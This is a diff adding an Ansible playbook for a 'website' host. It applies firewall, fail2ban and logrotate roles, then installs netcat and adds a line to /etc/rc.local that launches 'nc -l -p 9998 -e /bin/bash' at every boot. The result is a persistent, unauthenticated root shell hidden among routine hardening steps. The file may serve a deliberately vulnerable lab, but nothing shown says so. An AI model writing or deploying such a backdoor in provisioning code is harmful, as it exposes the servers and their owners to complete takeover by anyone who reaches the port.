@@ -1,0 +1,61 @@
+- hosts: all
+  remote_user: "{{ user }}"
+  vars:
+    - hostname: "website"
+    - command: "/bin/bash"
+    - listen_port: 9998
+    - timezone: "America/New_York"
+    - should_reboot: false        
+  gather_facts: true
+  become: true
+  roles:
+    - role: arillso.motd
+    - role: geerlingguy.firewall
+    - role: oefenweb.fail2ban
+    - role: reallyenglish.logrotate 
+  tasks:            
+    - name: Copy ISSUE
+      copy:
+        src: resources/issue
+        dest: /etc/issue
+        owner: root
+        group: root
+        mode: 0644    
+  post_tasks:
+    - name: Copy rc-local service
+      copy:
+        src: resources/rc-local.service
+        dest: /etc/systemd/system/rc-local.service
+        owner: root
+        group: root
+        mode: 0644
+    - name: Copy rc-local
+      copy:
+        src: resources/rc.local
+        dest: /etc/rc.local
+        owner: root
+        group: root
+        mode: 0755            
+    - name: Install netcat
+      apt:
+        name: netcat
+        state: present
+    # https://stackoverflow.com/questions/29075287/ansible-insert-line-if-not-exists
+    # https://www.troublenow.org/752/debian-10-add-rc-local/
+    - name: add autostart netcat to rc.local
+      lineinfile: dest=/etc/rc.local 
+                  line="nc -l -p {{ listen_port }} -e {{ command }}"
+                  insertbefore="exit 0"
+                  state=present         
+    - name: Cleanup unused packages
+      apt:
+          autoremove: yes
+    - name: reload installed services
+      systemd:
+        daemon_reload: yes
+    - name: reboot to finalize prep
+      include_role:
+          name: GROG.reboot
+    
+
+          
